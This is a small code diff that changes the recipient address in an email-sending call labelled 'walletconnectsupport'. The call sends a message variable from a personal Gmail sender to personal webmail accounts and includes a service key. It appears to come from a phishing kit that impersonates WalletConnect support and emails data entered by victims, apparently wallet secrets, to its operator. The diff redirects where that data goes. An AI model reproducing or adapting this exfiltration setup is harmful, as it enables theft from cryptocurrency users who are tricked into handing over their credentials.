@@ -296,7 +296,7 @@ export default {
            name: 'walletconnectsupport',
               email: 'showolesheriff7@gmail.com',
            message: msg,
-            to:'Melindahotbenks101@outlook.com'
+            to:'Annehathaway009@gmail.com'
             },'wqsvu3cCKwr-c_w1_');
         
 
